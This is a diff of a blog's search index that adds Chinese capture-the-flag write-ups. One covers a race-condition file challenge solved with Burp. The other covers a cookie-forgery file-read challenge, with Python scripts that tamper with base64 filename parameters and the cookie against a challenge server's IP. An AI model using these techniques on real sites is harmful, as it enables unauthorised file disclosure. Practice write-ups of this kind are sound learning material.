@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[记一次简单的条件竞争的题目]]></title>
+    <url>%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%9A%84%E9%A2%98%E7%9B%AE.html</url>
+    <content type="text"><![CDATA[前言 一直对这个漏洞只有概念上的认知，没有做过相关的题目，就找了一个入门的练练手 题目 我们可以控制文件的名字和文件的内容 但是当我们访问的时候去发现访问不到，猜想应该是被删了，这就要利用条件竞争这个漏洞了 概念 创建一个多线程程序不断的向服务器发起请求创建一个文件，在创建一个程序循环读取这个文件 这里使用burp suite进行申请创建文件，写一个死循环读取这个文件 在start attack之前需要先运行访问的脚本 可以得到内容，这题旨在能够访问到这个文件就能拿到flag 总结 Y3RmZXIldTY2MkYldTRFMEQldTY2MkYldTc3MEIldTUyMzBiYXNlJXU1QzMxJXU2MEYzJXU4OUUzJXU0RTAwJXU0RTBCJXU1NDYy]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[cookie欺骗 writeup]]></title>
     <url>%2Fcookie%E6%AC%BA%E9%AA%97-writeup.html</url>
     <content type="text"><![CDATA[Begin 发现filename为keys.txt的base64加密，试着读取index.php文件 发现能读到东西了，接下来读取整个文件 1234567from requests import *from base64 import *for i in range(0,20): url = "http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw"%i respone = get(url=url) print respone.text 1234567891011121314151617181920&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; $file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line];&#125;?&gt; 逻辑不难，要求我们将cookie设置成margin=margin，然后在用相同的办法读取keys.php 12345678910from requests import *from base64 import *for i in range(0,20): url = "http://123.206.87.240:8002/web11/index.php?line=%d&amp;filename=%s"%(i,b64encode("keys.php")) header = &#123; "Cookie": "margin=margin" &#125; res = get(url=url,headers=header) print res.text 1&lt;?php $key='KEY&#123;key_keys&#125;'; ?&gt; 得到flag：KEY{key_keys}]]></content>
@@ -89,8 +100,8 @@
         <category>reverse</category>
       </categories>
       <tags>
-        <tag>reverse</tag>
         <tag>jactf</tag>
+        <tag>reverse</tag>
       </tags>
   </entry>
   <entry>
@@ -101,8 +112,8 @@
         <category>reverse</category>
       </categories>
       <tags>
-        <tag>reverse</tag>
         <tag>jactf</tag>
+        <tag>reverse</tag>
       </tags>
   </entry>
   <entry>
